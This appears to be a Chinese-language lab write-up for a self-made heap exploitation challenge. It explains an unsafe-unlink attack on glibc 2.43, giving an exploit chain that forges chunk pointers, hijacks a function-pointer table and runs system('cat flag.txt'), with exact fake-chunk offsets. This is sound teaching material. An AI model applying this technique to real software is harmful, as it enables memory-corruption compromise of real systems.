# L10 · unsafe unlink（自造靶场，glibc 2.43）

> 2.29+ 的 `unlink_chunk()` 加了两道检查：
>
> ```c
> if (chunksize (p) != prev_size (next_chunk (p)))  -> corrupted size vs. prev_size
> if (FD->bk != p || BK->fd != p)                   -> corrupted double-linked list
> ```
>
> 但只要你手里有一个"指向 p 的全局指针"，就能把 `p->fd / p->bk` 伪造成
> `&ptr - 0x18 / &ptr - 0x10`，让两道检查同时通过 —— 这就是 unsafe unlink
> 在 2.43 上依然可用的原因。

## 0. 为什么不是 fastbin attack（重要的环境变迁）

原计划 L10 做 **fastbin attack**，在 host glibc 2.43 上实测不可行：

```console
$ /lib/x86_64-linux-gnu/libc.so.6 | head -1
GNU C Library (Ubuntu GLIBC 2.43-2ubuntu2.7) stable release version 2.43.
$ strings /lib/x86_64-linux-gnu/libc.so.6 | grep -c 'memory corruption (fast)'
0
$ strings /lib/x86_64-linux-gnu/libc.so.6 | grep -ci fastbin
0
```

更直接的证据：把 20 个 0x18 的块全部 free 之后 dump heap，前 16 个带 tcache
key，第 17 个开始直接和相邻块合并进 unsorted bin，**没有任何块进入 fastbin 链表**。
结论：**glibc 2.43 已经移除了 fastbin**（教材上的 `fastbin_index / fastbin dup`
在 2.43 上连符号都不存在），因此本节改为 unsafe unlink。

## 1. 环境

| 项 | 值 |
| --- | --- |
| 平台 | linux / amd64 |
| libc | **host glibc 2.43** |
| 编译 | `gcc -O0 -g -fno-pie -no-pie -fstack-protector-strong` |
| tcache 上限 | **16**（2.43 实测，不是教材上的 7） |

```bash
cd labs/lab_unsafe_unlink
make
printf '__PWNED__{unlink_ok}\n' > flag.txt
python exp.py            # 期望输出 __PWNED__{unlink_ok} 与 "unsafe unlink OK"
```

远程验证（可选）：

```bash
socat TCP-LISTEN:9999,reuseaddr,fork EXEC:./chal
HOST=127.0.0.1 PORT=9999 python exp.py
```

## 2. 漏洞

1. `edit(i)` 写 `sizes[i] + 8` 字节 —— 多出的 8 字节正好盖掉 next chunk 的 size；
2. `del` 不清 `slots[] / sizes[]` —— UAF，可以 `show / edit` 已释放的块。

## 3. 利用链

```
16 个 0xf8 块填满 tcache[0x100]      # 否则 free(a) 进 tcache，不会走 unlink 路径
add(0)=a, add(1)=b, add(2)=c         # 三个相邻 0x100 chunk；a 必须在 slot 0
del(0)                               # a 进 unsorted bin
edit(0, 伪块 + b.prev_size + b.size) # a->fd/a->bk 伪造，b.prev_inuse = 0
del(1)                               # 向前合并 → unlink(a.user) → slots[0] = FD
edit(0, '\0'*0x18 + p64(handlers))   # slots[0] 改成 &handlers
edit(0, p64(win))                    # handlers[0] = win
trigger(0)                           # → system("cat flag.txt")
```

## 4. 关键技巧：伪块 P 必须是 `a.user`（差 0x10 的坑）

`unlink` 的 `p` 是 **chunk 头**，而 `slots[]` 里存的是 **malloc 返回的 user 指针**
（`chunk + 0x10`）。如果按教科书写 `prev_size = 0x100`，`P` 就会是 `a.chunk`，
而 `FD->bk` 读出来的 `slots[0]` 是 `a.user`，两者差 0x10 →
`corrupted double-linked list`。

把 `prev_size` 改成 `0xf0`，伪块就正好落在 `a.user`：

| 位置 | 值 |
| --- | --- |
| `P = b - 0xf0 = a.user` | — |
| `a.user[0x08:0x10]` | `0xf0`（P->size，必须等于 prev_size） |
| `a.user[0x10:0x18]` | `FD = &slots[0] - 0x18` |
| `a.user[0x18:0x20]` | `BK = &slots[0] - 0x10` |
| `a.user[0xf0:0xf8]` | `b.prev_size = 0xf0` |
| `a.user[0xf8:0x100]` | `b.size = 0x100`（清掉 PREV_INUSE 位） |

于是：

* `FD->bk == *(FD+0x18) == slots[0] == a.user == P` ✔
* `BK->fd == *(BK+0x10) == slots[0] == P` ✔
* `chunksize(P) == 0xf0 == prev_size` ✔

unlink 结束后 `slots[0] = FD = &slots[0] - 0x18`，之后 `edit(0)` 写的就是
`.bss` 里 slots 前面那片区域，可以顺手把 `slots[0]` 自己改成 `&handlers`。

## 5. 预期失败点（踩过的坑）

1. **tcache 上限是 16**：只 free 7 个块的话，`free(a)` 仍然进 tcache，
   `del(1)` 永远不会触发 unlink。
2. **a 必须在 slot 0**：`FD/BK` 锚在 `slots[0]`，换成别的槽位就会
   `corrupted double-linked list`。
3. **`b.size` 要同时满足两件事**：清掉 PREV_INUSE（末位 0），且
   `chunk_at_offset(b, size)` 落在合法的 c 上。
4. **`slots[]` 与 `handlers[]` 的间距**：`MAXN = 64` 时两者相距够远，
   第二次 `edit` 覆盖不到 `sizes[A]`，否则后续 `edit` 的长度会变成 0。

## 6. 复现留痕

* 二进制：`chal`（`make` 生成）
* flag：`flag.txt`（verify_all.sh 用 `mk_flag` 自动写入）
* 一键验证：仓库根目录 `bash tools/verify_all.sh`，会跑 `L10` 这一行
* 回归证据：2026-11-26 实测 `PASS`，`__PWNED__{unlink_ok}`
* 调试开关：`ERRLOG=/tmp/e10.log python exp.py` 会把子进程 stderr 落盘，
  用来直接看 glibc 的 `malloc_printerr` 原文（例如
  `corrupted double-linked list`）。默认不设，无副作用。
